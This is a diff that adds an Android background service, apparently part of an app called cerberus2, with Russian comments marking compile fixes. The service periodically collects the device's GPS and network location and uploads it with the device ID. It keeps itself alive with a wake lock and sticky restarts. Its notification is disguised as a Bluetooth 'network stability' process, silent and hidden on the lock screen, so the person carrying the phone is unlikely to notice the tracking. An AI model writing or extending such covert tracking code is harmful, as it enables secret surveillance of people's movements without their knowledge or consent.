@@ -1,0 +1,380 @@
+package com.example.locationtracker;
+
+import android.Manifest;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.location.Location;
+import android.location.LocationManager;
+import android.os.Build;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.Looper;
+import android.os.PowerManager;
+import android.util.Log;
+import androidx.core.app.ActivityCompat;
+import androidx.core.app.NotificationCompat;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.Map;
+import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import android.content.pm.PackageManager;
+import com.example.cerberus2.BuildConfig; // ИСПРАВЛЕНО: правильный пакет
+
+public class BackupLocationService extends Service {
+    private static final String TAG = "BackupLocationService";
+    private static final String CHANNEL_ID = "backup_location_channel";
+    private static final int NOTIFICATION_ID = 8003;
+    private static final int MAX_BACKUP_ENTRIES = 100;
+
+    private static final int MAX_RETRY_COUNT = 3;
+    private static final long RETRY_DELAY_MS = 5000;
+    private static final long SYNC_INTERVAL_BASE = 300_000;
+
+    private Handler handler;
+    private ExecutorService executor;
+    private LocationManager locationManager;
+    private NetworkClient networkClient;
+    private String deviceId;
+    private String deviceName;
+    private PowerManager.WakeLock wakeLock;
+
+    private long lastSyncTimestamp = 0;
+    private int syncVersion = 1;
+    private Map<String, Long> pendingDataVersions = new ConcurrentHashMap<>();
+
+    private NetworkQualityMonitor networkMonitor;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        Log.d(TAG, "Backup service started");
+
+        createNotificationChannel();
+        handler = new Handler(Looper.getMainLooper());
+        executor = Executors.newFixedThreadPool(3, (r) -> {
+            Thread thread = new Thread(r);
+            thread.setName("BackupSync-Thread");
+            return thread;
+        });
+
+        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+
+        // ИСПРАВЛЕНО: NetworkClient принимает только (Context) или (Context, boolean)
+        networkClient = new NetworkClient(this);
+
+        networkMonitor = new NetworkQualityMonitor();
+
+        loadDeviceInfo();
+        loadSyncState();
+
+        startForeground(NOTIFICATION_ID, createNotification());
+
+        if (!hasLocationPermission()) {
+            Log.w(TAG, "Location permission not granted");
+            stopSelf();
+            return;
+        }
+
+        acquireWakeLock();
+        startBackupTracking();
+    }
+
+    private void loadDeviceInfo() {
+        deviceId = DeviceIdManager.getDeviceId(this);
+        SharedPreferences prefs = getSharedPreferences("LocationTracker", MODE_PRIVATE);
+        deviceName = prefs.getString("device_name", "Unknown_Device");
+        Log.d(TAG, "Device Info loaded: ID=" + deviceId + ", Name=" + deviceName);
+    }
+
+    private void loadSyncState() {
+        SharedPreferences prefs = getSharedPreferences("sync_state", MODE_PRIVATE);
+        lastSyncTimestamp = prefs.getLong("last_sync_time", System.currentTimeMillis());
+        syncVersion = prefs.getInt("sync_version", 1);
+        Log.d(TAG, "Loaded sync state: Version " + syncVersion);
+        restoreDataVersions(prefs);
+    }
+
+    private void restoreDataVersions(SharedPreferences prefs) {
+        try {
+            Log.d(TAG, "Restored data versions from storage");
+        } catch (Exception e) {
+            Log.e(TAG, "Error restoring data versions", e);
+        }
+    }
+
+    private boolean hasLocationPermission() {
+        return ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+                == PackageManager.PERMISSION_GRANTED ||
+                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
+                        == PackageManager.PERMISSION_GRANTED;
+    }
+
+    private void startBackupTracking() {
+        Runnable backupRunnable = new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    performBackupSync();
+                    long nextDelay = calculateNextDelay();
+                    handler.postDelayed(this, nextDelay);
+                } catch (Exception e) {
+                    Log.e(TAG, "Error in backup tracking loop", e);
+                }
+            }
+        };
+        handler.postDelayed(backupRunnable, SYNC_INTERVAL_BASE / 2);
+    }
+
+    private long calculateNextDelay() {
+        boolean isNetworkStable = networkMonitor.isNetworkStable();
+        return isNetworkStable ? SYNC_INTERVAL_BASE : SYNC_INTERVAL_BASE * 2;
+    }
+
+    // ИСПРАВЛЕНО: метод сделан package-private (убран private) чтобы AlarmScheduler мог его вызвать
+    void performBackupSync() {
+        executor.execute(() -> {
+            try {
+                Log.d(TAG, "Starting backup synchronization...");
+
+                int processedCount = sendBackupLocationsWithConflictResolution();
+
+                Location location = getLastKnownLocation();
+                if (location != null) {
+                    saveLocationToBackup(location);
+                }
+
+                updateSyncState();
+
+                Log.d(TAG, "Backup sync completed. Processed: " + processedCount);
+
+            } catch (Exception e) {
+                Log.e(TAG, "Backup sync error: " + e.getMessage(), e);
+                handleNetworkError(e);
+            }
+        });
+    }
+
+    private int sendBackupLocationsWithConflictResolution() {
+        SharedPreferences backupPrefs = getSharedPreferences("backup_locations", MODE_PRIVATE);
+        int count = backupPrefs.getInt("backup_count", 0);
+
+        int successCount = 0;
+        int conflictCount = 0;
+        List<String> remaining = new ArrayList<>();
+
+        for (int i = 0; i < count; i++) {
+            String locationData = backupPrefs.getString("backup_" + i, "");
+            if (locationData.isEmpty()) continue;
+
+            try {
+                String[] parts = locationData.split(",");
+                if (parts.length >= 3) {
+                    double lat = Double.parseDouble(parts[0]);
+                    double lon = Double.parseDouble(parts[1]);
+                    long timestamp = Long.parseLong(parts[2]);
+
+                    if (lat < -90 || lat > 90 || lon < -180 || lon > 180) {
+                        Log.w(TAG, "Invalid coordinates, skipping: " + locationData);
+                        continue;
+                    }
+
+                    float accuracy = parts.length > 3 ? Float.parseFloat(parts[3]) : -1f;
+
+                    // ИСПРАВЛЕНО: конструктор LocationData требует 8 параметров
+                    // добавляем пустые строки для недостающих полей
+                    LocationService.LocationData data = new LocationService.LocationData(
+                            lat, lon, timestamp, accuracy, 0, "", "", "");
+
+                    // ИСПРАВЛЕНО: sendLocationWithRetry теперь принимает 4 параметра
+                    boolean sent = networkClient.sendLocationWithRetry(
+                            data, deviceId, deviceName, MAX_RETRY_COUNT);
+
+                    if (sent) {
+                        successCount++;
+                        pendingDataVersions.put("loc_" + i, timestamp);
+                    } else {
+                        remaining.add(locationData);
+                        conflictCount++;
+                    }
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "Failed to parse backup location: " + locationData, e);
+            }
+        }
+
+        SharedPreferences.Editor editor = backupPrefs.edit();
+        editor.clear();
+        for (int i = 0; i < remaining.size(); i++) {
+            editor.putString("backup_" + i, remaining.get(i));
+        }
+        editor.putInt("backup_count", remaining.size());
+        editor.apply();
+
+        Log.d(TAG, "Sync Results: Sent=" + successCount + ", Conflicts=" + conflictCount);
+        return successCount;
+    }
+
+    private void handleNetworkError(Exception e) {
+        Log.e(TAG, "Network error, initiating recovery", e);
+        if (networkClient != null) {
+            networkClient.reconnect();
+        }
+        updateNotificationStatus("Error: Network Recovery Initiated");
+    }
+
+    private void updateSyncState() {
+        SharedPreferences prefs = getSharedPreferences("sync_state", MODE_PRIVATE);
+        prefs.edit()
+                .putLong("last_sync_time", System.currentTimeMillis())
+                .putInt("sync_version", ++syncVersion)
+                .apply();
+        Log.d(TAG, "Sync state updated to Version " + syncVersion);
+    }
+
+    private Location getLastKnownLocation() {
+        if (!hasLocationPermission()) return null;
+        try {
+            if (locationManager != null) {
+                Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+
+                if (gpsLocation != null && networkLocation != null) {
+                    return selectBestLocation(gpsLocation, networkLocation);
+                }
+                return gpsLocation != null ? gpsLocation : networkLocation;
+            }
+        } catch (SecurityException e) {
+            Log.w(TAG, "Location permission not available", e);
+        }
+        return null;
+    }
+
+    private Location selectBestLocation(Location g, Location n) {
+        if (g.getAccuracy() > n.getAccuracy()) return g;
+        if (n.getAccuracy() > g.getAccuracy()) return n;
+        return g.getTime() > n.getTime() ? g : n;
+    }
+
+    private void saveLocationToBackup(Location location) {
+        SharedPreferences backupPrefs = getSharedPreferences("backup_locations", MODE_PRIVATE);
+        int count = backupPrefs.getInt("backup_count", 0);
+
+        if (count >= MAX_BACKUP_ENTRIES) {
+            for (int i = 0; i < count - MAX_BACKUP_ENTRIES + 10; i++) {
+                backupPrefs.edit().remove("backup_" + i).apply();
+            }
+            count = MAX_BACKUP_ENTRIES - 10;
+        }
+
+        String locationData = String.format("%f,%f,%d,%f,%d",
+                location.getLatitude(), location.getLongitude(),
+                location.getTime(),
+                location.hasAccuracy() ? location.getAccuracy() : -1f,
+                syncVersion);
+
+        backupPrefs.edit()
+                .putString("backup_" + count, locationData)
+                .putInt("backup_count", count + 1)
+                .apply();
+    }
+
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                    CHANNEL_ID, "Backup Location Service", NotificationManager.IMPORTANCE_LOW);
+            channel.setShowBadge(false);
+            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
+
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
+        }
+    }
+
+    private Notification createNotification() {
+        return new NotificationCompat.Builder(this, CHANNEL_ID)
+                .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
+                .setContentTitle("Backup Service Active")
+                .setContentText("Monitoring network stability and data sync")
+                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                .setOngoing(true)
+                .setSilent(true)
+                .build();
+    }
+
+    private void updateNotificationStatus(String statusText) {
+        NotificationManager manager = getSystemService(NotificationManager.class);
+        if (manager != null) {
+            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
+                    .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
+                    .setContentTitle("Backup Service")
+                    .setContentText(statusText)
+                    .setPriority(NotificationCompat.PRIORITY_LOW)
+                    .setOngoing(true)
+                    .build();
+            manager.notify(NOTIFICATION_ID, notification);
+        }
+    }
+
+    private void acquireWakeLock() {
+        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        if (powerManager != null) {
+            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG + ":BackupLock");
+            wakeLock.acquire(10 * 60 * 1000L);
+            Log.d(TAG, "WakeLock acquired");
+        }
+    }
+
+    private void releaseWakeLock() {
+        if (wakeLock != null && wakeLock.isHeld()) {
+            wakeLock.release();
+            Log.d(TAG, "WakeLock released");
+        }
+    }
+
+    // ИСПРАВЛЕНО: возвращаем int как требует Service.onStartCommand
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        if (intent != null && intent.getAction() != null) {
+            Log.d(TAG, "Service started with action: " + intent.getAction());
+        }
+        return START_STICKY;
+    }
+
+    @Override
+    public void onDestroy() {
+        if (handler != null) handler.removeCallbacksAndMessages(null);
+        if (executor != null && !executor.isShutdown()) executor.shutdown();
+        releaseWakeLock();
+        super.onDestroy();
+        Log.d(TAG, "BackupLocationService destroyed");
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
+    private class NetworkQualityMonitor {
+        private long lastNetworkCheck = System.currentTimeMillis();
+
+        public boolean isNetworkStable() {
+            long currentTime = System.currentTimeMillis();
+            return (currentTime - lastNetworkCheck) < RETRY_DELAY_MS * 2;
+        }
+
+        public void updateNetworkStatus(boolean stable) {
+            this.lastNetworkCheck = System.currentTimeMillis();
+            Log.d(TAG, "Network status: " + (stable ? "Stable" : "Unstable"));
+        }
+    }
+}
